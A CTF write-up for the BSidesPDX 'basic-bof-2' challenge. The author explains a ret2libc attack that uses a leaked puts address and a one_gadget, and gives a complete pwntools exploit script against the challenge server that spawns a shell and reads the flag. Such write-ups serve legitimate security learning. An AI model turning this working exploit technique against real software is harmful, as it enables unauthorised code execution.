#basic-bof-2 

This is my first experience with a ret2libc attack.  Thankfully I was able to get some help from my peers on the basics as well as some pretty good tools to use :)

Running the binary for the first time, looks like we get an address leak, but since PIE is enabled, this number is going to be different everytime.

Luckily, since we know the address during run time before we have to supply any input, we can just parse that address out and use it to find the base of where libc is located.

So far, we have:
```python
from pwn import *
import os, sys
#io = process('./basic-bof')
io = remote('basic-bof-2.bsidespdxctf.party', 9999)

context(arch = "amd64")
libc = ELF("libc-2.27.so")
elf = ELF("./basic-bof")

leak = int(io.recvline().decode().split("but there is ")[1].split(".")[0], 16)
base = leak - libc.symbols["puts"]
```

Now that we know where the base of libc is, we just need to overwrite RIP with the location we want to jump to.  I used one_gadget to get a list of possible places that would give us a shell: `one_gadget libc-2.27.so`

```
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Sweet, we have everything we need to build the full payload.  Using a trick I learned from a teammate, I can just repeat the location I want to jump to many times to fill that buffer.  

Here is the final exploit:

```python
from pwn import *
import os, sys
#io = process('./basic-bof')
io = remote('basic-bof-2.bsidespdxctf.party', 9999)

context(arch = "amd64")
libc = ELF("libc-2.27.so")
elf = ELF("./basic-bof")

leak = int(io.recvline().decode().split("but there is ")[1].split(".")[0], 16)
base = leak - libc.symbols["puts"]
one_gadget = 0x4f365

payload = p64(base + one_gadget) * 8
log.info(payload)

io.sendline(payload)
io.interactive()
```

And running it we get:
```
[*] Switching to interactive mode

Get a shell: $ cat flag.txt
BSidesPDX{r3t_t0-0ne_g@dg3t}
```

This challenge was a great learning experience for me, and I learned a lot about this type of exploit!
